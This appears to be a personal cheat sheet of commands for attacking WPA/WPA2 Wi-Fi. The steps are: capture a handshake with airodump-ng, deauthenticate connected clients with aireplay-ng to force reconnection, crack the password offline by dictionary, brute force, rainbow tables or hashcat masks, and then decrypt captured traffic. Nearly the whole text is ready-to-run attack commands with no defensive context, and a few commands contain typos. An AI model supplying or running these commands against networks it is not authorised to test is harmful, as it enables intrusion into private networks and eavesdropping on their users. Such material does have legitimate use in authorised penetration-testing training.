----------------------------------------------
Capturing a Handshake and Cracking WPA / WPA2-
----------------------------------------------

Sniffing on target network until a client connects to network: 
iw wlan0 set channel <#>
airodump-ng --bssid <MAC> --channel <#> --write <filename> wlan0  

Deauth Clients to force reconnections: 
aireplay-ng --deauth 5 -a <target AP mac> -c <Client Mac> wlan0

Dictionary Crack the password with Aircrack: 
aircrack-ng <handshake.cap> -w <wordlistFile>

Saving your cracking session for long dictionary attacks:
pipe john output into aircrack-ng save as a session then restore that session

john --wordlist=<wpa-wordlist> --stdout --session=<sessionFileName> | aircrack-ng -w - -b <targetMac> <handshake.cap>
john --restore=<sessionFileName>| aircrack-ng -b <targetMac>  -w - <handshake.cap>

Brutefocing passes instead of wordlists: 
Use crunch with a mask and pipe it to aircrack
crunch 8 8 | aircrack-ng -b <targetMac>  -w - <handshake.cap>

Bruteforcing with session saving:
crunch 8 8 | john --stdin --session=<sessionFileName> --stdout | aircrack-ng -b <targetMac>  -w - <handshake.cap>
crunch 8 8 | john --restore=<sessionFileName>| aircrack-ng -b <targetMac>  -w - <handshake.cap>




-------------------------------------
Faster Cracking With Rainbow Tables:-
-------------------------------------
PreCompute Rainbow Tables on an SSID: 

Create Database and combine SSID with Wordlist: 
airolib-ng <DB_Output_File> --import passwd <WordList>   (add wordlist)
echo "SSID_Name"  > AP_NameFile.txt     (Add SSID) 
airolib-ng <DB_Output_File> --import essid <NameFile.txt> 
airolib-ng <DB_Output_File> --batch

Crack with the Rainbow Table: 
aircrack-ng -r <DB_Output_File>  <handshake.cap>


--------------------------
HashCat for Cracking: -
---------------------------

First create a file from the pcap that hashcat understands with hcxpcapngtool
hcxcapngtool -o <CrackableHandshake> <capture.pcap>


Cracking with Hashcat Masks upper lower hex special digets and all:  (?l , ?u, ?d, ?s, ?a, ?h, ?H)
hashcat -m 22000 -a 3 <CrackableHandshake> "?l?l?l?l?l?l?l?l"   (8 lowercase characters)
hashcat -m 22000 -a 3 <CrackableHandshake> "?h?h?h?h?h?h?h?h  (8 hex characters) 
hashcat -m 22000 -a 3 <CrackableHandshake> "?a?a?a?a?a?a?a?a"  (All characters 8 length) 
hashcat -m 22000 -a 3 <CrackableHandshake> "CCLabs?a?a?a?a?a?a"  (8 charcactors brutecorce andwe know the first 2 length)
hashcat -m 22000 -a 0 <CrackableHandshake> <wordlist>  (Cracking with a dictionary) 

Show the cracked hashes:
hashcat -m 22000 -a 0 <CrackableHandshake>  --show

Decrypt packets once you have the key: 
airdecap-ng -p <password> -e SSID <capture.cap>
